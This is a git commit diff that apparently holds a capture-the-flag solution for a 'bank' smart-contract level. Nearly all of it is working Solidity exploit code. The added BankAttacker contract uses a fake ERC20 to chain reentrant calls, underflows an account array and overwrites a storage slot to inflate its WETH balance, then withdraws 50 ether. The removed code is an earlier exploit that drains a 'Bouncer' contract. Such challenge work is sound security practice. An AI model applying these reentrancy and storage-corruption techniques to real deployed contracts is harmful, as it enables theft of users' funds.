5cb52a2fce04c2e454376e87f6d92650e971e46b
ski <ski@skis-MacBook-Pro.local>
2022-02-21 20:15:44 +0300

    final solution for bank level;

--- contracts/bank/AttackBank.sol
+++ contracts/bank/AttackBank.sol
@@ -1,40 +1,156 @@
-pragma solidity ^0.8.0;
+pragma solidity 0.4.24;
 
-import "public/Setup.sol";
+import "../WETH9.sol";
+import "./Bank.sol";
+import "hardhat/console.sol";
 
-contract Sender {
-    constructor(address to) payable {
-        selfdestruct(payable(to));
-    }
-}
+contract BankAttacker {
+    Bank public bank;
+    WETH9 public weth;
+    uint256 reentrancyState = 0;
 
-contract Exploit {
-    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
-    Setup setup;
-    Bouncer bouncer;
-
-    constructor(Setup _setup) payable {
-        setup = _setup;
-
-        bouncer = setup.bouncer();
-
-        // pay 1 eth fee to create the entry
-        bouncer.enter{value: 1 ether}(ETH, 10 ether);
+    constructor(address _bank, address _weth) {
+        bank = Bank(_bank);
+        weth = WETH9(_weth);
     }
 
-    function go() public payable {
-        // send 7 additional eth to get our entry fee plus the 2 fees sent by the
-        // other user
-        new Sender{value: 7 ether}(address(bouncer));
+    function attack() external payable {
+        console.log("attack start");
 
-        uint256 num = 7;
-        uint256[] memory req = new uint256[](num);
-        for (uint256 i = 0; i < num; i++) {
-            req[i] = 0;
+        // start re-entrancy chain
+        reentrancyState = 1;
+        bank.depositToken(0, address(this), 0);
+
+        // should have underflowed accounts.length
+
+        // we want to write to accounts[this][0].balances[WETH]
+        writeToBalanceSlot();
+
+        // (string memory name, uint256 uniqTokens) = bank.getAccountInfo(0);
+        // console.log("name %s", name);
+        // console.log("uniqTokens %s", uniqTokens);
+
+        uint256 wethBalance = bank.getAccountBalance(0, address(weth));
+        console.log("balance %s", wethBalance);
+
+        bank.withdrawToken(0, weth, 50 ether);
+    }
+
+    function writeToBalanceSlot() internal {
+        // slot for accounts[this][0]
+        uint256 accountStructSlot = getAccountLocation(0);
+        console.log("accountStructSlot %s", accountStructSlot);
+
+        // we want to write to accounts[this][0].balances[WETH]
+        uint256 wethBalanceSlot = getMapLocation(
+            accountStructSlot + 2,
+            uint256(address(weth))
+        );
+        console.log("wethBalanceSlot %s", wethBalanceSlot);
+        // console.logBytes32(bytes32(wethBalanceSlot));
+
+        // using setAccountName we can write to accounts[this][accountId].name
+        // keccak(keccak(addr . 2)) + 3 * accountId = accountStructSlot + 3 * accountId
+        // therefore need to write with accountId = (wethBalanceSlot - accountStructSlot) / 3
+        uint256 accountId = wethBalanceSlot - accountStructSlot;
+        console.log("accountId mod 3 %s", accountId % 3);
+        require(accountId % 3 == 0, "mod 3 != 0, use different contract addr");
+        accountId = (wethBalanceSlot - accountStructSlot) / 3;
+        console.log("accountId %s", accountId);
+
+        // needs to be less than 32 bytes for string to be stored inline
+        // stores AAA in msb, size * 2 in lowerbits, i.e.,
+        // balance = 0x4141414141414141414141410000000000000000000000000000000000000018
+        string memory toWrite = "AAAAAAAAAAAA";
+        bank.setAccountName(accountId, toWrite);
+    }
+
+    function getArrayLocation(
+        uint256 slot,
+        uint256 index,
+        uint256 elementSize
+    ) public pure returns (uint256) {
+        return
+            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);
+    }
+
+    function getMapLocation(uint256 slot, uint256 key)
+        public
+        pure
+        returns (uint256)
+    {
+        return uint256(keccak256(abi.encodePacked(key, slot)));
+    }
+
+    function getAccountLocation(uint256 accountId)
+        public
+        view
+        returns (uint256)
+    {
+        // gets accounts[addr][accountId].accountName
+        // = keccak(keccak(addr . 2)) + 3 * accountId (if string size < 32)
+        // need to convert address(this) to uint256 first (!!)
+        uint256 slot = uint256(
+            keccak256(abi.encodePacked(uint256(address(this)), uint256(2)))
+        );
+        slot = uint256(keccak256(slot));
+        slot += accountId * 3;
+        return slot;
+    }
+
+    // fake ERC20 that allows us to re-enter
+    // no need to keep track of balances because using balance=0 works
+    function transferFrom(
+        address, /* from */
+        address, /* to */
+        uint256 /* amount */
+    ) external returns (bool) {
+        // console.log("transferFrom");
+        return true;
+    }
+
+    function transfer(
+        address, /* to */
+        uint256 /* amount */
+    ) external returns (bool) {
+        // console.log("transfer");
+        return true;
+    }
+
+    // don't declare as view, will still be called and we can re-enter
+    function balanceOf(
+        address /* who */
+    ) public returns (uint256) {
+        // things are complicated because closeLastAccount requires
+        // uniqueTokens == 0, but withdraw requires uniqueTokens == 1
+        // withdraw, re-enter on first balance,
+        //    deposit, re-enter on first balance,
+        //        closeLastAccount (uniqueTokens == 0)
+        //    deposit continues execution and sets uniqueTokens to 1
+        // withdraw continues execution and deletes account again
+        // console.log("balanceOf called");
+        if (reentrancyState == 1) {
+            reentrancyState++;
+            console.log("with-drawing %s", reentrancyState);
+
+            bank.withdrawToken(0, this, 0);
+        } else if (reentrancyState == 2) {
+            reentrancyState++;
+            console.log("depositing %s", reentrancyState);
+
+            bank.depositToken(0, this, 0);
+        } else if (reentrancyState == 3) {
+            reentrancyState++;
+            console.log("closing %s", reentrancyState);
+
+            // close before deposit uniqueTokens++ is reached
+            bank.closeLastAccount();
         }
-        bouncer.convertMany{value: 10 ether}(address(this), req);
-        bouncer.redeem(ERC20Like(ETH), uint256(num * 10 ether));
+
+        return 0;
     }
 
-    receive() external payable {}
+    function() external payable {
+        console.log("fallback called");
+    }
 }
